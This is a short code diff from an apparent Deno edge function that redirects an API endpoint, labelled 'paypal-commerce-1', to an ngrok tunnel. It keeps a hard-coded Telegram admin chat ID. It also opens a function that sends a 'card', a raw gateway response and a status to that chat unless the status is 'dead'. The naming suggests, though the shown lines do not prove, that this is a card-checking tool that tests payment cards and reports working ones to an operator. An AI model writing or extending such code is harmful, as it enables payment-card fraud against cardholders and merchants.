@@ -11,7 +11,7 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
 
-const API_URL = "https://api-5ucv.onrender.com/api/paypal-commerce-1";
+const API_URL = "https://dierdre-unscoring-adalyn.ngrok-free.dev";
 
 async function sendAdminDebug(card: string, rawResponse: string, status: string) {
   if (!TELEGRAM_BOT_TOKEN || status === "dead") return;
